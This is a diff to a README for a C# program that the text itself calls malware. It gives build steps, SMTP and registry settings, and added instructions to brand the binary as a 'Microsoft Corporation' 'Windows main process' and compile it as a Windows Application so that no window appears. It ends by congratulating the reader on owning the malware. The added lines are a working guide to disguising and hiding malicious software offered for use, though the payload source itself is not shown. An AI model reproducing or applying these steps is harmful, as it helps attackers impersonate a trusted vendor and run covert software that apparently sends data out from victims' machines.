@@ -23,6 +23,8 @@ To use this malware first you have to download the source code compossed of the 
 2. _SysMainProcess.Constants.cs_
 3. _SysMainProcess.ico_
 
+Create a new folder for your project and paste those files.
+
 Then modify _SysMainProcess.Constants.cs_ with the required parameters:
 
 `private const ushort SMTP_PORT = Your SMTP port;`  
@@ -34,7 +36,36 @@ Then modify _SysMainProcess.Constants.cs_ with the required parameters:
 `private const ushort MAX_ASCII_CODE = Maximun ASCII code used;`  
 `private const string REGISTRY_FILE_NAME = "YourRegistryFileName.dll";` 
 
-And to finalize compile the .NET Framework 4.0 project using some IDE like Visual Studio Community, and then run the result exe file on your test destination, it should be located in the \bin folder of your project.
+You should also create an _AssemblyInfo.cs_ file within a new folder called Properties in the source code directory with the following code:
+
+    using System.Reflection;
+    using System.Runtime.CompilerServices;
+    using System.Runtime.InteropServices;
+
+    [assembly: AssemblyTitle("SysMainProcess")]
+    [assembly: AssemblyDescription("Windows main process.")]
+    [assembly: AssemblyConfiguration("")]
+    [assembly: AssemblyCompany("Microsoft Corporation")]
+    [assembly: AssemblyProduct("SysMainProcess")]
+    [assembly: AssemblyCopyright("Copyright ©  2021")]
+    [assembly: AssemblyTrademark("Microsoft Corporation")]
+    [assembly: AssemblyCulture("")]
+
+    [assembly: ComVisible(false)]
+
+    [assembly: AssemblyVersion("1.0.0.0")]
+    [assembly: AssemblyFileVersion("1.0.0.0")]
+    
+And a file labeled _App.config_ in the source code directory specifying the framework version in use:
+
+    <?xml version="1.0" encoding="utf-8"?>
+    <configuration>
+        <startup> 
+            <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.0,Profile=Client"/>
+        </startup>
+    </configuration>
+
+And to finalize compile and build the .NET Framework 4 Client Profile project using some IDE like Visual Studio Community, dont forget to set in the project properties this project as a _Windows Application_ instead of a _Console_, so no GUI appears. Then run the result exe file on your test destination, it should be located in the \bin folder of your project, if the exe file is located among more files you also need all these files.
 
 Congratulations now you own your own copy of this malware!
 
